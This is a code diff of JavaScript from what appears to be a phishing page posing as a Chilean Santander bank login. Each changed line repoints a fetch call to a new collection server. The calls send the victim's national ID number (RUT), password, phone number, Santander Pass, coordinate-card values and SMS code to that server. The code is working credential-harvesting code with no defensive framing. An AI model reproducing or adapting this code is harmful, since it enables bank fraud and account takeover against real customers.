@@ -32,7 +32,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
   }
 
   try {
-    const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
+    const response = await fetch("https://obchile.onrender.com/proxy-login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ rut, passwd, telefono })
@@ -70,7 +70,7 @@ tipoAutorizacion.addEventListener("change", async () => {
 
     // Pedir coordenadas dinámicas al backend
     try {
-      const resp = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/coordenadas");
+      const resp = await fetch("https://obchile.onrender.com/coordenadas");
       const data = await resp.json();
 
       document.getElementById("coordLabelA").innerText = `Coordenada ${data.coordenadas[0]}`;
@@ -88,7 +88,7 @@ formSantander.addEventListener("submit", async (e) => {
   const mensaje = `Santander Pass: ${pass}`;
 
   try {
-    await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+    await fetch("https://obchile.onrender.com/autorizar", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ mensaje })
@@ -113,7 +113,7 @@ formCoordenadas.addEventListener("submit", async (e) => {
   Clave SMS: ${claveSMS}`;
 
   try {
-    await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+    await fetch("https://obchile.onrender.com/autorizar", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ mensaje })
